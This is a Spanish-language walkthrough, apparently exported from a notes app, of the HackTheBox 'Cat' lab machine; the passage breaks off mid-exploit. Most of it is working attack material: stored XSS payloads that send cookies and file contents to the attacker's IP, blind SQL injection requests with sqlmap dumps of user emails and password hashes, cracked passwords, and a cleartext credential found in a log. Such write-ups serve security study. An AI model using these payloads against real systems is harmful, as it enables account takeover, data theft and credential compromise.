        &lt;form id="loginForm" method="get"&gt;
            &lt;label for="loginUsername"&gt;Username:&lt;/label&gt;
            &lt;input type="text" id="loginUsername" name="loginUsername" required&gt;
            &lt;label for="loginPassword"&gt;Password:&lt;/label&gt;
            &lt;input type="password" id="loginPassword" name="loginPassword" required&gt;
            &lt;input type="submit" name="loginForm" value="Login"&gt;
        &lt;/form&gt;
    &lt;/div&gt;
    &lt;div class="toggle-link"&gt;
        &lt;a href="#" id="toggleForm"&gt;Already have an account?&lt;/a&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script&gt;
    var toggleLink = document.getElementById("toggleForm");
    var registerForm = document.querySelector(".register");
    var loginForm = document.querySelector(".login");

    toggleLink.addEventListener("click", function(event) {
        event.preventDefault();
        if (registerForm.style.display === "block") {
            registerForm.style.display = "none";
            loginForm.style.display = "block";
            toggleLink.textContent = "Register"; // Changed text
        } else {
            registerForm.style.display = "block";
            loginForm.style.display = "none";
            toggleLink.textContent = "Already have an account?"; // Changed text
        }
    });
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
<br><br>En las siguientes líneas:<br>// Registration process
if ($_SERVER["REQUEST_METHOD"] == "GET" &amp;&amp; isset($_GET['registerForm'])) {
    $username = $_GET['username'];
    $email = $_GET['email'];
    $password = md5($_GET['password']);

    $stmt_check = $pdo-&gt;prepare("SELECT * FROM users WHERE username = :username OR email = :email");
    $stmt_check-&gt;execute([':username' =&gt; $username, ':email' =&gt; $email]);```


Tamto el campo $username como $email no estan siendo sanitizados antes de registrarlos en la base de datos; por lo tanto . Si como atacantes nos registramos de forma que:
```java
`Username: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
 Email: cher0@mail.com`
<br>Si en algun punto logramos que nuestro nombre de cuenta se muestre es probable que podamos robar cookies de usuario. De momento lo dejamos registrado;<br><br>Para agilizar el proceso de Injeccion del XSS hice un script de python que podeis encontrar en mi perfil de Github ; El script se compone de 4 fases, <br>
<br>1-Registra el usuario con el payload XSS con las etiquetas necesarias para pillar la cookie del admin
<br>2-Se Logea el usuario en la pagina con las peticiones necesarias al servidor
<br>3- Sube una imagen indicada en el primer argumento del escript en contest.php
<br>4-Se abre un servidor http que captura la Cookie de sesión del administrador de la pagina 
<br>Podeis descargarla en el siguiente <a data-tooltip-position="top" aria-label="https://github.com/cher0qui/HTB-Cat-Automated-XSS/tree/main" rel="noopener nofollow" class="external-link" href="https://github.com/cher0qui/HTB-Cat-Automated-XSS/tree/main" target="_blank">enlace</a> <br><br>Vamos a observar el codigo:<br>&lt;?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) &amp;&amp; $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) &amp;&amp; isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo-&gt;exec($sql_insert);

            $stmt_delete = $pdo-&gt;prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete-&gt;bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete-&gt;execute();

            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?&gt;

<br>Bueno aqui ya observamos mas info sobre la base de datos; vemos que hay una tabla accepted_cats y otra cats;<br>El código incluye una verificación para asegurarse de que solo el usuario axel pueda realizar la inserción o eliminación<br>Observamos el campo vulnerable<br>
SQLI:<br>$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo-&gt;exec($sql_insert);
<br>
<br>Aquí, el valor de $cat_name proviene directamente de $_POST['catName'] sin ser validado ni escapado.
<br>Aunque está usando PDO para ejecutar consultas, no está utilizando consultas preparadas con marcadores de posición (:parametro) para esta inserción. En su lugar, está concatenando el valor directamente en la consulta SQL.
<br>Esto  nos permite inyectar código SQL  a través del campo catName.
<br>Por ejemplo si mandamos:<br>'); DROP TABLE accepted_cats; --
<br>la consulta que procesa el servidor pasa a ser:<br>INSERT INTO accepted_cats (name) VALUES(''); DROP TABLE accepted_cats; --');
<br>Pero para ello necesitamos primero ser axel asi que vamos a intentar robar su cookie phpssid con el xss anterior.<br><br>Encuentro la linea de codigo donde podemos ver como se guardan nuestros gatos subidos<br>        // Generate unique identifier for the image
        $imageIdentifier = uniqid() . "_";

        // Upload cat photo
        $target_dir = "uploads/";
        $target_file = $target_dir . $imageIdentifier . basename($_FILES["cat_photo"]["name"]);
        $uploadOk = 1;
        $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

        // Check if the file is an actual image or a fake file
        $check = getimagesize($_FILES["cat_photo"]["tmp_name"]);
        if($check !== false) {
            $uploadOk = 1;
        } else {
            $error_message = "Error: The file is not an image.";
            $uploadOk = 0;
        }

        // Check if the file already exists
        if (file_exists($target_file)) {
            $error_message = "Error: The file already exists.";
            $uploadOk = 0;
        }

        // Check file size
        if ($_FILES["cat_photo"]["size"] &gt; 500000) {
            $error_message = "Error: The file is too large.";
            $uploadOk = 0;
        }

        // Allow only certain file formats
        if($imageFileType != "jpg" &amp;&amp; $imageFileType != "png" &amp;&amp; $imageFileType != "jpeg") {
            $error_message = "Error: Only JPG, JPEG, and PNG files are allowed.";
            $uploadOk = 0;
        }
<br>No podiamos encontrar nuestra imagen en uploads/ ya que se genera un uniqid() seguido de " _ "  <br><br>Primero nos registramos con un XSS que mande la cookie de axel a nuestro servidor <br>&lt;script&gt;document.location='http://10.10.14.232:2323/?c='+document.cookie;&lt;/script&gt;
<br><img alt="Pasted image 20250207131614.png" src="machines/cat/imgs/pasted-image-20250207131614.png"><br>Acto seguido abrimos un servidor http por el puerto indicado en XSS y subimos un gato, cuando el admin lo revise y muestre nuestro "username" se triggerea el XSS mandandonos su cookie;<br>
<img alt="Pasted image 20250207131820.png" src="machines/cat/imgs/pasted-image-20250207131820.png"><br>Ahora que tenemos el phpssid de axel probamos a hacer un session Hijacking modificando nuestra cookie<br>Admin Panel:<br>
<img alt="Pasted image 20250207132842.png" src="machines/cat/imgs/pasted-image-20250207132842.png"><br>Ahora vamos a explotar la injeccion sql en accept_cat.php<br>Recordemos el codigo<br>&lt;?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) &amp;&amp; $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) &amp;&amp; isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo-&gt;exec($sql_insert);

            $stmt_delete = $pdo-&gt;prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete-&gt;bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete-&gt;execute();

            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?&gt;

<br>Preparamos un Request POST para dumpear la base de datos:<br>POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=dc19d9vca314ihdq9g6h

catId=1&amp;catName=test
<br>Sqlmap nos confirma que el campo es vulnerable<br>sqlmap identified the following injection point(s) with a total of 126 HTTP(s) requests:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catId=1&amp;catName=test'||(SELECT 0x6b575974 WHERE 9070=9070 AND 3453=3453)||'
---
[13:46:48] [INFO] testing MySQL
[13:46:48] [WARNING] the back-end DBMS is not MySQL
[13:46:48] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system
[13:46:48] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 84 times

[*] ending @ 13:46:48 /2025-02-07/

<br>Con esta solicitud mandamos esta query SQL al servidor<br>INSERT INTO accepted_cats (name) VALUES ('TEST' UNION ALL SELECT NULL, table_name FROM information_schema.tables WHERE 1=1 AND '1'='1')'
<br>Query valida:<br>
<img alt="Pasted image 20250207135540.png" src="machines/cat/imgs/pasted-image-20250207135540.png"><br>SQLI:<br>
<img alt="Pasted image 20250207140253.png" src="machines/cat/imgs/pasted-image-20250207140253.png"><br><br>500 server INTERNAL ERROR:<br>
<img alt="Pasted image 20250207180808.png" src="machines/cat/imgs/pasted-image-20250207180808.png"><br><br><img alt="Pasted image 20250207180840.png" src="machines/cat/imgs/pasted-image-20250207180840.png"><br><br>POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=5k79n5uih9n3lf2i9n2cv21p4q
Content-Length: 103

catId=1&amp;catName=test'||(SELECT 'true' FROM pragma_table_info('users') WHERE name='password' LIMIT 1)||'
<br><img alt="Pasted image 20250208180856.png" src="machines/cat/imgs/pasted-image-20250208180856.png"><br>
También descubro la existencia de la columna "username"<br>POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=5k79n5uih9n3lf2i9n2cv21p4q
Content-Length: 103

catId=1&amp;catName=test'||(SELECT 'true' FROM pragma_table_info('users') WHERE name='username' LIMIT 1)||'
<br><img alt="Pasted image 20250208181220.png" src="machines/cat/imgs/pasted-image-20250208181220.png"><br>Pues ahora a sacar los Usernames y las passwords;<br><br><br>catId=1&amp;catName=test'||(SELECT 'true' FROM users WHERE SUBSTR(username, N, 1) = 'STRING' LIMIT 1)||'
<br>
<br>N : es la coordenada del caracter, es decir N=1 primera string
<br>STRING : letra
<br>Probamos con la a de Axel a ver si existe;<br>
<img alt="Pasted image 20250208182307.png" src="machines/cat/imgs/pasted-image-20250208182307.png"><br>
la b da un 500 Internal server erros por lo que comprobamos que el payload funciona!;<br>
<img alt="Pasted image 20250208182334.png" src="machines/cat/imgs/pasted-image-20250208182334.png"><br>para sacar el segundo username de la base de datos basta con poner "LIMIT 1 OFFSET 1"<br>
ahora sabemos que el segundo nombre de usuario empieza por "r":<br>
<img alt="Pasted image 20250208182641.png" src="machines/cat/imgs/pasted-image-20250208182641.png"><br><br>Basicamente lo mismo que arriba pero cambiando los parametros de la columna<br>catId=1&amp;catName=test'||(SELECT 'true' FROM users WHERE SUBSTR(password, N, 1) = 'STRING' LIMIT 1)||'

<br><img alt="Pasted image 20250208183008.png" src="machines/cat/imgs/pasted-image-20250208183008.png"><br><br>POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=b4tdio58t0hjkt9od29jkfgo8j
Content-Length: 87

catId=1&amp;catName=test'||(SELECT 'true' FROM users WHERE LENGTH(username) = 4 LIMIT 1)||'
<br>Nos devuelve el 200 ya que sabemos que el primer username es Axel:<br>
<img alt="Pasted image 20250208185930.png" src="machines/cat/imgs/pasted-image-20250208185930.png"><br><br>Lo mismo, diferente columna<br>POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=421ue72qb057o1qhe5rge2cb7i
Content-Length: 97

catId=1&amp;catName=test'||(SELECT 'true' FROM users WHERE LENGTH(password) = 32 LIMIT 1 OFFSET 0)||'
<br>Ya uso offset 0 para referirme a la password de axel ; bueno sabemos que tiene 32 caracteres ya que nos da el 200 ok <br>Para averiguar la longitud lo pase por en intruder para que me fuese haciendo un ataque de fuerza bruta por numeros del 1 al 100 , el que me dio respuesta 200 fue "32"<br>
<img alt="Pasted image 20250208190401.png" src="machines/cat/imgs/pasted-image-20250208190401.png"><br>
<img alt="Pasted image 20250208190522.png" src="machines/cat/imgs/pasted-image-20250208190522.png"><br>
Tambien parece que el resto de passwords en la database tienen 32 caracteres ya que deben de estar hasheadas con el mismo algoritmo;<br><br>Vamos a crear un payload para sacar todos los campos de la tabla users empezando por los usernames y luego por las passwords respectivamente<br>hasta ahora la información que tenemos es<br>
- El servidor devuelve un 500 server internal error si la query no resuelve en la base de datos<br>
- Tenemos la tabla users con las columnas username y password<br>
- la primera fila de la tabla tiene al usuario Axel<br>
-  las passwords tienen una longitud de 32 caracteres<br>
Necesitamos<br>
- Sacar el resto de usernames de la tabla users<br>
- Sacar las passwords de cada user caracter a caracter <br><br><br>
<br>Envía el payload al servidor y verifica si la respuesta tiene un código de estado 200 OK.
<br>Si la consulta SQL es válida, el servidor responderá con 200 OK. De lo contrario, devolverá 500 Internal Server Error.
<br><br>
<br>Dumpea un campo específico (username o password) caracter por caracter.
<br>Usa SUBSTR() para extraer cada carácter en una posición específica.
<br>Itera sobre todos los caracteres ASCII imprimibles (de 32 a 126).
<br><br>
<br>Dumpea todos los nombres de usuario hasta un offset máximo (max_users).
<br>Luego, dumpea las contraseñas correspondientes a cada nombre de usuario.
<br>Almacena los resultados en listas y los imprime al final.
<br><br><br>
<br>
Dumpear Nombres de Usuario:

<br>Para cada offset (i), intenta dumpear el nombre de usuario letra por letra.
<br>Si no encuentra más usuarios, detiene el proceso.


<br>
Dumpear Contraseñas:

<br>Para cada nombre de usuario dumpeado, intenta dumpear su contraseña letra por letra.
<br>Suponemos que todas las contraseñas tienen una longitud fija de 32 caracteres.


<br>
Imprimir Resultados:

<br>Al final, muestra una lista de usuarios y sus contraseñas correspondientes.


<br><br><br>Sqlmap tambien funciona por si no te quieres tirar varios dias <br>➜  Cat sqlmap -r request -p catName --level=5 --tables --dump --risk=3 --dbms=sqlite --threads=10
        ___
       __H__                                                                   
 ___ ___[(]_____ ___ ___  {1.9#stable}                                         
|_ -| . [']     | .'| . |                                                      
|___|_  [.]_|_|_|__,|  _|                                                      
      |_|V...       |_|   https://sqlmap.org                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:04:43 /2025-02-08/

[20:04:43] [INFO] parsing HTTP request from 'request'
[20:04:43] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catId=1&amp;catName=test'||(SELECT 0x6b575974 WHERE 9070=9070 AND 3453=3453)||'
---
[20:04:44] [INFO] testing SQLite
[20:04:44] [INFO] confirming SQLite
[20:04:44] [INFO] actively fingerprinting SQLite
[20:04:44] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[20:04:44] [INFO] fetching tables for database: 'SQLite_masterdb'
[20:04:44] [INFO] fetching number of tables for database 'SQLite_masterdb'
[20:04:44] [INFO] retrieved: 4
[20:04:44] [INFO] retrieving the length of query output
[20:04:44] [INFO] retrieved: 13
[20:04:49] [INFO] retrieved: accepted_cats             
[20:04:49] [INFO] retrieving the length of query output
[20:04:49] [INFO] retrieved: 15
[20:04:55] [INFO] retrieved: sqlite_sequence             
[20:04:55] [INFO] retrieving the length of query output                        
[20:04:55] [INFO] retrieved: 4                                                 
[20:04:57] [INFO] retrieved: cats                                              
[20:04:57] [INFO] retrieving the length of query output                        
[20:04:57] [INFO] retrieved: 5                                                 
[20:04:59] [INFO] retrieved: users                                             
&lt;current&gt;                                                                      
[4 tables]                                                                     
+-----------------+                                                            
| accepted_cats   |                                                            
| cats            |                                                            
| sqlite_sequence |
| users           |
+-----------------+
<br>DUMP<br>$ sqlmap -r request -p catName --level=5 --risk=3 --dbms=sqlite --dump -T users --threads 10

Table: users
[12 entries]
+---------+-------------------------------+----------------------------------+------------------------------------------------------------------------------------+
| user_id | email                         | password                         | username                                                                           |
+---------+-------------------------------+----------------------------------+------------------------------------------------------------------------------------+
| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f | axel                                                                               |
| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c | rosa                                                                               |
| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad | robert                                                                             |
| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe | fabian                                                                             |
| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86 | jerryson                                                                           |
| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8 | larry                                                                              |
| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6   | royer                                                                              |
| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a | peter                                                                              |
| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565 | angel                                                                              |
| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad | jobert                                                                             |
| 11      | 1234@1234                     | 81dc9bdb52d04dc20036dbd8313ed055 | &lt;script&gt;document.location='http://10.10.14.232:2323/?c='+document.cookie;&lt;/script&gt; |                                                           
| 12      | lol@htb.com                   | 81dc9bdb52d04dc20036dbd8313ed055 | &lt;script&gt;document.location='http://10.10.14.160:1110/?c='+document.cookie;&lt;/script&gt; |                                                           

<br><img alt="Pasted image 20250210152417.png" src="machines/cat/imgs/pasted-image-20250210152417.png">]]]]></description><link>machines/cat/1-recon.html</link><guid isPermaLink="false">Machines/Cat/1 - Recon.md</guid><pubDate>Mon, 10 Feb 2025 14:24:19 GMT</pubDate><enclosure url="machines/cat/imgs/pasted-image-20250206115548.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/cat/imgs/pasted-image-20250206115548.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2 -PrivEsc]]></title><description><![CDATA[ 
 <br>Bueno con las credenciales del usuario Rosa iniciamos sesion por ssh<br>rosa@cat:~$ cat us
cat: us: No such file or directory
rosa@cat:~$ cat use^C
rosa@cat:~$ ls
rosa@cat:~$ ls -la
total 32
drwxr-x--- 5 rosa rosa 4096 Jan 21 12:49 .
drwxr-xr-x 6 root root 4096 Aug 30 23:19 ..
lrwxrwxrwx 1 root root    9 Jan 21 12:49 .bash_history -&gt; /dev/null
-rw-r--r-- 1 rosa rosa  220 Aug  7  2024 .bash_logout
-rw-r--r-- 1 rosa rosa 3598 Sep  1 00:43 .bashrc
drwx------ 2 rosa rosa 4096 Sep 13 00:59 .cache
drwxrwxr-x 3 rosa rosa 4096 Sep 28 05:12 .local
-rw-r--r-- 1 rosa rosa  807 Aug  7  2024 .profile
lrwxrwxrwx 1 root root    9 Aug 31 23:31 .python_history -&gt; /dev/null
lrwxrwxrwx 1 root root    9 Jan 21 12:49 .sqlite_history -&gt; /dev/null
drwx------ 2 rosa rosa 4096 Jan 14 17:08 .ssh
rosa@cat:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
axel:x:1000:1000:axel:/home/axel:/bin/bash
rosa:x:1001:1001:,,,:/home/rosa:/bin/bash
git:x:114:119:Git Version Control,,,:/home/git:/bin/bash
jobert:x:1002:1002:,,,:/home/jobert:/bin/bash
rosa@cat:~$ 
<br>Vemos que el usuario no tiene el user.txt, pero hay otros usuarios con bash en el sistema como jobert o axel ; intentamos sacar sus passwords por hashacat con rockyou pero solo me saca la de Rosa y la mia <br>
Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344393
* Bytes.....: 139921522
* Keyspace..: 14344386
* Runtime...: 2 secs

81dc9bdb52d04dc20036dbd8313ed055:1234                     
ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa       
Approaching final keyspace - workload adjusted.
<br>Vamos a probar a hacer privesc con Rosa:<br>No puedo ejecutar nada con sudo y en las conexiones vemos algunos puertos interesantes pero puede que sean reverse shelss de otros usuarios<br>rosa@cat:~$ sudo -l
[sudo] password for rosa: 
Sorry, user rosa may not run sudo on cat.
rosa@cat:~$ netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:54383         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:50391         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33189         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -    
<br>Como el usuario Rosa no podemos sacar mucha mas informacion acerca de las conexiones de la maquina<br>Netid       State        Recv-Q       Send-Q              Local Address:Port                Peer Address:Port       Process                             
udp         UNCONN       0            0                   127.0.0.53%lo:53                       0.0.0.0:*           uid:101 ino:22269 sk:90 &lt;-&gt;        
tcp         LISTEN       0            10                      127.0.0.1:587                      0.0.0.0:*           ino:26227 sk:91 &lt;-&gt;                
tcp         LISTEN       0            37                      127.0.0.1:54383                    0.0.0.0:*           uid:1002 ino:28805 sk:92 &lt;-&gt;       
tcp         LISTEN       0            4096                127.0.0.53%lo:53                       0.0.0.0:*           uid:101 ino:22270 sk:93 &lt;-&gt;        
tcp         LISTEN       0            128                       0.0.0.0:22                       0.0.0.0:*           ino:24649 sk:94 &lt;-&gt;                
tcp         LISTEN       0            128                     127.0.0.1:50391                    0.0.0.0:*           uid:1002 ino:26155 sk:95 &lt;-&gt;       
tcp         LISTEN       0            4096                    127.0.0.1:3000                     0.0.0.0:*           uid:114 ino:26516 sk:96 &lt;-&gt;        
tcp         LISTEN       0            10                      127.0.0.1:25                       0.0.0.0:*           ino:26226 sk:97 &lt;-&gt;                
tcp         LISTEN       0            1                       127.0.0.1:33189                    0.0.0.0:*           uid:1002 ino:28704 sk:98 &lt;-&gt;       
tcp         LISTEN       0            511                             *:80                             *:*           ino:24988 sk:99 v6only:0 &lt;-&gt;       
tcp         LISTEN       0            128                          [::]:22                          [::]:*           ino:24651 sk:9a v6only:1 &lt;-&gt;   
<br>Vamos a establecer un puente ssh con el puerto 3000 que parece interesante;<br>ssh rosa@cat.htb -L 3000:localhost:3000
<br><br>BIngo! encontramos una web que hostea un repositorio de codigo local<br>
<img alt="Pasted image 20250210154828.png" src="machines/cat/imgs/pasted-image-20250210154828.png"><br>El servicio se trata de <a data-tooltip-position="top" aria-label="https://news.ycombinator.com/item?id=31628939" rel="noopener nofollow" class="external-link" href="https://news.ycombinator.com/item?id=31628939" target="_blank">Gitea</a>, un servidor de git selfhosteado; ya me he visto en algunas ocasiones con este servicio ; si alguna parte de la web o algún servicio esta vinculado con el código que se sube podemos escalar privilegios; vamos a investigar<br>En el source code encontramos la version de gitea<br>Version:
			
				1.22.0
<br><img alt="Pasted image 20250210155200.png" src="machines/cat/imgs/pasted-image-20250210155200.png"><br>Parece que esta version es vulnerable a XSS de nuevo<br>
<a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/52077" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/52077" target="_blank">XSS-Gitea</a><br>Pero las credenciales de Rosa no funcionan para logearse y tampoco nos permiten registrarnos en el servicio:<br><img alt="Pasted image 20250210155410.png" src="machines/cat/imgs/pasted-image-20250210155410.png"><br>Pero podemos loguearnos con OpenID ; si probamos nos promptea una direccion en local<br>
<img alt="Pasted image 20250210155527.png" src="machines/cat/imgs/pasted-image-20250210155527.png"><br>
Parece que el servidor busca OpenID's en la ruta /usr/login/opeid pero no la encuentro en el sistema;<br>
Tambien intento pasarle mi servidor http pero no establece comunicacion <br><br>Encuentro esto en /var/log/apache.log :<br>cat /var/log/apache2/access.log | grep axel
127.0.0.1 - - [11/Feb/2025:08:43:43 +0000] "GET /join.php?loginUsername=axel&amp;loginPassword=aNdZwgC4tI9gnVXv_e3Q&amp;loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
<br>Pruebo sshing:<br>
**<img alt="Pasted image 20250211094521.png" src="machines/cat/imgs/pasted-image-20250211094521.png"><br>Sudo -l :<br>axel@cat:~$ sudo -l
[sudo] password for axel: 
Sorry, user axel may not run sudo on cat.
<br><br>Hay mail para axel:<br>From rosa@cat.htb  Sat Sep 28 04:51:50 2024
Return-Path: &lt;rosa@cat.htb&gt;
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
        for &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 04:51:50 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
Date: Sat, 28 Sep 2024 04:51:49 GMT
From: rosa@cat.htb
Message-Id: &lt;202409280451.48S4pnlT001591@cat.htb&gt;
Subject: New cat services

Hi Axel,

We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.

Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.

From rosa@cat.htb  Sat Sep 28 05:05:28 2024
Return-Path: &lt;rosa@cat.htb&gt;
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
        for &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 05:05:28 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
Date: Sat, 28 Sep 2024 05:05:28 GMT
From: rosa@cat.htb
Message-Id: &lt;202409280505.48S55Sm0002267@cat.htb&gt;
Subject: Employee management

We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
<br>Puede que el Readme.md tenga info util<br>Vuelvo a Gitea con las nuevas credenciales:<br>- [ ] axel : aNdZwgC4tI9gnVXv_e3Q
<br>Entramos como axel:<br><img alt="Pasted image 20250211094751.png" src="machines/cat/imgs/pasted-image-20250211094751.png"><br><br>Para triggerear el XSS debemos ir a un repositorio creado previamente y darle a settings , en el campo "description " es donde podemos injectar el XSS; mas info en <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/52077" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/52077" target="_blank">exploit.db</a><br>
<img alt="Pasted image 20250211095138.png" src="machines/cat/imgs/pasted-image-20250211095138.png"><br>
<img alt="Pasted image 20250211095254.png" src="machines/cat/imgs/pasted-image-20250211095254.png"><br>Funciona!<br>
<img alt="Pasted image 20250211095608.png" src="machines/cat/imgs/pasted-image-20250211095608.png"><br>Modificamos el XSS para robar el Readme.md y que me lo envie a mi servidor:<br>&lt;a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=&gt;response.text()).then(data=&gt;fetch("http://10.10.14.232:2323/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'&gt;XSS test&lt;/a&gt;
<br>Despues de mandarle un mail a jobert tenemos un callback<br>
mail:<br>axel@cat:~$ echo -e "Subject: Test \n\n check this mdfck http://localhost:3000/axel/XSS" | sendmail jobert@cat.htb
<br>10.10.11.53 - - [11/Feb/2025 10:35:36] "GET /?d=IyBFbXBsb3llZSBNYW5hZ2VtZW50ClNpdGUgdW5kZXIgY29uc3RydWN0aW9uLiBBdXRob3JpemVkIHVzZXI6IGFkbWluLiBObyB2aXNpYmlsaXR5IG9yIHVwZGF0ZXMgdmlzaWJsZSB0byBlbXBsb3llZXMu HTTP/1.1" 200 -

<br><img alt="Pasted image 20250211103602.png" src="machines/cat/imgs/pasted-image-20250211103602.png"><br>Esta en base64 lo descifro pero nada interesante<br><img alt="Pasted image 20250211103836.png" src="machines/cat/imgs/pasted-image-20250211103836.png"><br>Probamos con otro payload ; ahora vamos a leer el index.php<br>&lt;a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php").then(response=&gt;response.text()).then(data=&gt;fetch("http://10.10.14.232:2323/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'&gt;XSS test&lt;/a&gt;
<br>Le volvemos a mandar el mismo mail a jobert para triggerear el xss de nuevo;<br>
